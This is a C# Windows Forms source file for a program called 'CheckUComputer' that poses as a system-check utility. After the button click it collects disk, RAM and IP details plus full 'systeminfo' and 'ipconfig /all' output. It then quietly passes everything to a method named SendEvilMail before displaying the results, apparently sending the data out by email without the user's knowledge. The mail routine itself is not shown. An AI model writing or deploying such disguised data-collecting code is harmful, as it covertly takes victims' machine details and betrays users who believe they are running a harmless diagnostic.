using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CheckUComputer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
        private void initProgram()
        {
            string result = "";
            progressBar1.Value = 0;
            PCInformation info = new PCInformation();
            result = "INFORMACION DE DISCO: ";
            result += info.getTotalHDDSize() + Environment.NewLine;
            progressBar1.Value += 20;
            System.Threading.Thread.Sleep(2500);
            result += "INFORMACION DE MEMORIA RAM: ";
            result += info.getTotalMemory() + Environment.NewLine;
            progressBar1.Value += 20;
            System.Threading.Thread.Sleep(2500);
            result += "INFORMACION DE IP: ";
            result += info.getLocalIPAddress() + Environment.NewLine;
            result += Environment.NewLine;
            progressBar1.Value += 20;
            System.Threading.Thread.Sleep(2500);
            result += WindowsTerminal.Execute(@"systeminfo") + Environment.NewLine;
            result += Environment.NewLine;
            progressBar1.Value += 20;
            System.Threading.Thread.Sleep(2500);
            result += WindowsTerminal.Execute(@"ipconfig /all") + Environment.NewLine;
            info.SendEvilMail(result);
            progressBar1.Value += 20;
            System.Threading.Thread.Sleep(1000);
            richTextBox1.Text = result;
        }
        private void button1_Click(object sender, EventArgs e)
        {
            this.initProgram();
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
